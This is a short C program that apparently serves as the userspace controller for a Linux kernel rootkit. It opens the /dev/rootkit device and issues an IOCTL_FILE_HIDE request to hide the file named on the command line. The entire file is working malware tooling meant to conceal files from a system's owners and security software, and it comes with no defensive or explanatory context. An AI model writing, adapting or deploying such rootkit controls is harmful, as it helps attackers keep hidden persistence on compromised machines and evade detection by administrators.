#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include "rootkit.h"

int main(int argc, char *argv[]) {
    int fd;
    struct hided_file hided_file = {0};
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <file>\n", argv[0]);
        return -1;
    }

    strncpy(hided_file.name, argv[1], NAME_LEN);
    hided_file.name[NAME_LEN - 1] = '\0';
    hided_file.len = strlen(hided_file.name);

    fd = open("/dev/rootkit", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    if (ioctl(fd, IOCTL_FILE_HIDE, &hided_file) < 0) {
        perror("ioctl");
        return -1;
    }

    close(fd);
    return 0;
}
